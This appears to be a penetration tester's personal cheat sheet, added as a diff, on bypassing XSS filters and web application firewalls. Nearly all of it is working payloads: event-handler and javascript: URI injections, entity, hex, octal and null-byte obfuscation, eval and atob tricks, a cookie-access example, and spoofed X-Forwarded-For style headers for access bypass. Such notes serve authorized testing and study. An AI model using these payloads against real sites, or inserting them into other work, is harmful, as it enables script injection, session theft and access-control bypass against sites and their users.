@@ -1,0 +1,193 @@
+https://github.com/0xVIC/CheatSheets/blob/master/Cross-site%20scripting/WAF_bypasses.md
+https://n3t-hunt3r.gitbook.io/pentest-book/
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://medium.com/@rocky_rowdy/xss-cheatsheet-a49e5cc16fbd
+https://github.com/whoishacked/burp_xss_restriction_bypass_checker
+
+
+CHEATSHEET - most important:
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+Identify allowed tags with intruder, try payloads under 'Restricted characters', etc. It is a goldmine when it comes to XSS payloads, and can be a dealbreaker when it comes to exploitation. 
+
+
+
+CYBERCHEF operations:
+
+
+
+ALL CHARACTER ESCAPING CAN STAY TOGETHER
+
+- To HTML entity - try different specs, add leading zeros, null bytes, omit trailing semicolon; both the entirety of the payload, as well as only parts of it 
+
+- Unicode Text Format + Escape Unicode Characters - try exchanging some of the chars for their unicode counterpart; play with padding, prefix, etc.
+
+- To Octal - exchange choosen characters; inject them into the payload as so:
+eval('alert(1)') -> eval('a\154ert(1)')
+
+- To Hex - exchange choosen characters; inject them into the payload as so:
+eval('alert(1)') -> eval('a\x6cert(1)')
+
+Can also plainly escape characters that don't need that - might fool some filters:
+eval('a\l\ert\(1)');
+
+
+
+PORTSWIGGER METHODS:
+
+
+
+- bypass Signature-Based XSS Filters: modify script code:
+
+determine which characters or expressions within your input are triggering the filter, then, try to bypass/obfuscate:
+
+<object data="data:text/html;base64,{base64value}">
+<svg onload="alert(1)">
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+
+
+
+- bypass XSS filters by enumerating permitted tags and attributes:
+
+bruteforce valid tags, and then attributes, using:
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+this is very generic, if the XSS happens somewhere in the DOM, the approach will be different
+
+
+
+
+- bypass Signature-Based XSS Filters: Modifying HTML
+
+Consider the following simple exploit:
+<img onerror=alert(1) src=a>
+
+You can modify this syntax in numerous ways and have your code execute, techniques follow:
+
+1) vary the tag case:
+<iMg onerror=alert(1) src=a>
+
+2) arbitrary tag names:
+<x onclick=alert(1) scr=a>click here</x>
+
+3) null bytes:
+<[%00]img onerror=alert(1) src=a>
+
+4) space following the tag name
+
+Several characters can replace the space between the tag names and the first attribute name:
+<img/onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+<img """><script>alert("alert(1)")</script>">
+
+Note: you should always try adding some superfluous content after the tag name, this could work as a bypass:
+<script/anyjunk>alert(1)</script>
+
+5) attribute delimiters
+
+delimiters = quotes/spaces/whitespaces 
+examples:
+<img onerror="alert(1)"src=a>
+<img onerror='alert(1)'src=a>
+<img onerror=`alert(1)`src=a>
+
+Switching around the attributes provides a further way to bypass some filters:
+<img src='a'onerror=alert(1)>
+
+By combining quote-delimited attributes with unexpected characters following the tag name, attacks can be devised that do not use any whitespace, thereby bypassing some simple filters:
+<img/onerror="alert(1)"src=a>
+
+6) attribute names and values
+
+Within the attribute name and value, you can use the same NULL byte trick described earlier.
+<img onerror=a[%00]lert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+
+You can also HTML-encode characters within the value:
+<img onerror=a&#x6c;ert(1) src=a>
+
+Or, while injecting into a script, try injecting HTML entities, eg:
+&apos;; alert(1);//
+this will become:
+'; alert(1);//
+possibly terminating the input string and making the alert execute
+
+Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters.
+
+It is also worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding may overlook. You can use both decimal and hexadecimal format, add superfluous leading zeros, and omit the trailing semicolon:
+
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+
+
+
+
+
+- DYNAMICALLY CONSTRUCTED STRINGS
+
+concatenation
+<script>eval('al'+'ert(1)');</script>
+
+base64 decoding
+eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));
+
+alternatives to eval
+'alert(1)'.replace(/.+/,eval)
+
+avoiding dots
+alert(document['cookie'])
+
+
+
+
+
+- COMBINING MULTIPLE TECHNIQUES
+
+the "e" character in "alert" has been escaped using Unicode escaping, and the backslash used in the Unicode escape has been HTML-encoded:
+<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+
+
+
+
+
+- TAG SHENENIGANS
+
+<script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<scr<object>ipt>alert(1)</script>
+
+When you are injecting into a quoted string inside an existing script, it is common to find that the application sanitizes your input by placing the backslash character before any quotation mark characters you submit, preventing you from terminating the string and injecting arbitrary script.
+In this situation, you should always verify whether the backslash character itself is being escaped. If not, a simple filter bypass is possible, by submitting your own backslash at the point where the application inserts a backslash. The first backslash escapes the second, so that the following character remains unescaped.
+
+
+
+
+- LENGHT LIMITS
+
+HASH slicing
+https://portswigger.net/support/xss-filters-beating-length-limits-using-dom-based-techniques
+
+SHORTENED payloads
+https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads
+
+SPANNED PAYLOADS
+https://portswigger.net/support/xss-filters-beating-length-limits-using-spanned-payloads
+
+
+
+OTHER METHODS:
+
+these headers:
+X-Forwarded-For: 127.0.0.1
+X-Remote-Ip: 127.0.0.1
+X-Originating-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+
